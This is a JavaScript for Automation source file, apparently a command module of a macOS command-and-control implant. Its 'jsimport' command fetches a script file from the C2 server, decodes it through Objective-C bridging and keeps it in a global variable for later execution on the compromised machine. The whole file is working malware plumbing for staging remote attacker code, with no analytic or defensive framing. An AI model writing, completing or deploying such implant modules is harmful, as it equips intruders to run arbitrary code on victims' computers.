exports.jsimport = function(task,command,params){
    let script = "";
    try{
        let config = JSON.parse(params);
        if(config.hasOwnProperty("file")){
            let script_data = C2.upload(task, config['file']);
            if(typeof script_data === "string"){
                return{"user_output":"Failed to get contents of file", "completed": true, "status": "error"};
            }
            script = ObjC.unwrap($.NSString.alloc.initWithDataEncoding(script_data, $.NSUTF8StringEncoding));
        }
        else{
            return {"user_output":"Need to supply a valid file to download", "completed": true, "status": "error"};
        }
        jsimport = script;
        return {"user_output":"Imported the script", "completed": true};
    }
    catch(error){
        return {"user_output":error.toString(), "completed": true, "status": "error"};
    }
};
COMMAND_ENDS_HERE